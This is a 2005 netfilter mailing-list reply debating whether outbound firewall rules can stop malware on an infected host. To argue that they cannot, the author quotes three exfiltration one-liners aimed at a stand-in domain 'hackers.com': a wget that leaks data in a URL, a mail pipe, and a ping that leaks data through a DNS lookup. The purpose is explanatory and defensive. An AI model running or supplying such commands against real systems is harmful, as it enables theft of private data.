From: Frank Gruellich <frank@der-frank.org>
Subject: Re: Nice ZoneAlarm that might be useful for Iptables
Date: Mon, 20 Jun 2005 07:28:33 +0200
Message-ID: <20050620052833.GP28123@der-frank.org>
References: <429BDF9F.7070707@mindspring.com>
	<20050531043310.GF3681@der-frank.org>
	<20050619214142.GN3217@metastasis.org.uk>
Mime-Version: 1.0
Return-path: <netfilter-bounces@lists.netfilter.org>
Content-Disposition: inline
In-Reply-To: <20050619214142.GN3217@metastasis.org.uk>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: </pipermail/netfilter>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
Sender: netfilter-bounces@lists.netfilter.org
Errors-To: netfilter-bounces@lists.netfilter.org
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: netfilter@lists.netfilter.org
Cc: Nick Drage <nickd@metastasis.org.uk>

* Nick Drage <nickd@metastasis.org.uk> 19. Jun 05:
> On Tue, May 31, 2005 at 06:33:10AM +0200, Frank Gruellich wrote:
> > AFAIK Zonealarm it means, that a program starts a server: it listens on
> > a port.  For Unix it needs root priveleges to listen on ports below 1024
> > (dunno about Windows).
> AFAICT any program or user can open a socket on any port if it's not
> already in use.

You're talking about Windows, don't you?

> > While OUTPUT has nothing to do with servers, it is simply impossible.
> > You can't protect an infected host.
> Of course you can.
> 
> If the malware doesn't have root, [snip].

The important thing I implied.  I wouldn't call it infection if it
doesn't run as root.  Then it's just ... broken, messy.

> > How do you intend to catch
> >  $ wget 'http://www.hackers.com/script.php?info=this%20is%20my%20very%20secret%20information'
> Use a proxy?

We were talking about local actions, weren't we?  A local proxy?  Much
effort, isn't it?  You have to use a transparent one, you know?  Who
decides, that script.php at hackers.com is going to be filtered?

> >  $ echo "this is the very secret information" |mail -s "$USER@`hostname -f`" jr@hackers.com
> A mail server or Network IDS set to pick up on the terms used in such
> secret information.

A local IDS?  Wow!  This doesn't sound like a single host system.

> >  $ ping -c1 www.this.is.my.very.secret.information.hackers.com
> Stop ICMP ping outbound?  Why would that be needed by normal users?

The penetration is not the ICMP but the DNS resolve.  hackers.com is a
bad guy's domain running some "special" kind of DNS server.  I've seen
shells running this way.

> You can't completely block malware from accessing the Internet, but you
> can make it really, really difficult...

No, it's IMHO not that difficult.

Kind
 regards, Frank.
-- 
Sigmentation fault

